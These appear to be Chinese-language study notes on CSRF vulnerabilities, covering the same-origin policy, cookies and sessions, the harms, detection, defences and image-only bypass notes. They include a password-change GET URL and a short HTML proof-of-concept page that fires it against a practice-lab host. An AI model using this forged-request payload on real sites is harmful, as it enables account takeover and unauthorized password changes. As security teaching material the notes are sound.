# CSRF漏洞原理

浏览器跨域策略

浏览器同源策略

```
请求的url地址,与浏览器上的url地址处于同域上,也就是域名,端口,协议相同.
```

cookie和session机制

```
会话（Session）跟踪是Web程序中常用的技术，用来跟踪用户的整个会话。Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。
Cookie技术是客户端的解决方案，Cookie就是由服务器发给客户端的特殊信息，而这些信息以文本文件的方式存放在客户端，然后客户端每次向服务器发送请求的时候都会带上这些特殊的信息。
Session技术则是服务端的解决方案，它是通过服务器来保持状态的，Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。
Domain: cookie适用的域名，若不指定，则默认为创建cookie的服务器的域名
Path: cookie适用的path
Expires: 到期时间，若不指定，则浏览器关闭时即删除
Secure:指示是否仅当在HTTPS链接上才传输
HttpOnly: 加以限制，使得cookie不能被JavaScript脚本访问(意味着不能JS不能通过document.cookie的方式访问cookie)

```

# CSRF漏洞危害

所有涉及到数据增删改查的地方都会涉及到csrf漏洞

1.对网站的管理员进行更改密码攻击

2.修改受害者网站的用户账户和数据

3.劫持受害者的账户

4.CSRF结合SQL注入进行脱裤攻击

5.CSRF结合XSS攻击受害者路由器

```
http://daishen.ltd:1111/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change
```

# CSRF检测方法

查看是否有csrf_tokne，没有任何验证，可能存在漏洞

csrf+xss实例

```
<!DOCTYPE html>
<html lang=" zh-CN">
<head>
<meta charset="UTF-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document</title>
</head>
<body>
<!--讲下面的ip地址改为自己的靶场地址-->
<script src="http://daishen.ltd:1111/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change"
</body>
</html>
```

# CSRF防御方法

1.不要使用get请求，建议所有的涉及到数据的地方都使用post请求。

2.加入csrf_tokne验证或者验证码

3.加入referer判断请求地址是否来源于当前页面

# CSRF绕过方法

![image-20210615161659041](D:\BaiduNetdiskDownload\安全\CSRF跨站请求伪造\CSRF跨站请求伪造.assets\image-20210615161659041.png)

![image-20210615161802996](D:\BaiduNetdiskDownload\安全\CSRF跨站请求伪造\CSRF跨站请求伪造.assets\image-20210615161802996.png)

![image-20210615161855295](D:\BaiduNetdiskDownload\安全\CSRF跨站请求伪造\CSRF跨站请求伪造.assets\image-20210615161855295.png)

![image-20210615161933240](D:\BaiduNetdiskDownload\安全\CSRF跨站请求伪造\CSRF跨站请求伪造.assets\image-20210615161933240.png)

![image-20210615162104224](D:\BaiduNetdiskDownload\安全\CSRF跨站请求伪造\CSRF跨站请求伪造.assets\image-20210615162104224.png)

![image-20210615162212003](D:\BaiduNetdiskDownload\安全\CSRF跨站请求伪造\CSRF跨站请求伪造.assets\image-20210615162212003.png)

